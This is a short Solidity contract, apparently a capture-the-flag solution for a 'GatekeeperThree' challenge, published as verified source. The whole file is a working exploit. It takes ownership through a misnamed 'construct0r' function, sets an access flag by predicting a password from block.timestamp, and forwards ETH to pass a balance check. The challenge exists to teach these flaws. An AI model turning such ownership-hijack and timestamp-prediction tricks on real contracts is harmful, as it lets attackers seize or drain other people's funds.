/**
 *Submitted for verification at Etherscan.io on 2023-01-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface GatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256) external;
    function enter() external returns (bool);
}

contract GatekeeperThreeSolution {
    constructor() payable {}

    function solve(address _gatekeeper) external {
        GatekeeperThree gatekeeper = GatekeeperThree(_gatekeeper);

        // Solve gateOne
        gatekeeper.construct0r(); // Sets owner to this contract

        // Solve gateTwo
        gatekeeper.createTrick();
        gatekeeper.getAllowance(block.timestamp); // Sets allow_enterance to true

        // Solve gateThree
        // Forwards this contract's balance to gatekeeper. Must be at least 0.001 ETH
        (bool success, ) = payable(address(gatekeeper)).call{
            value: address(this).balance
        }("");
        require(success, "Transfer failed.");

        // Completes the problem
        gatekeeper.enter();
    }
}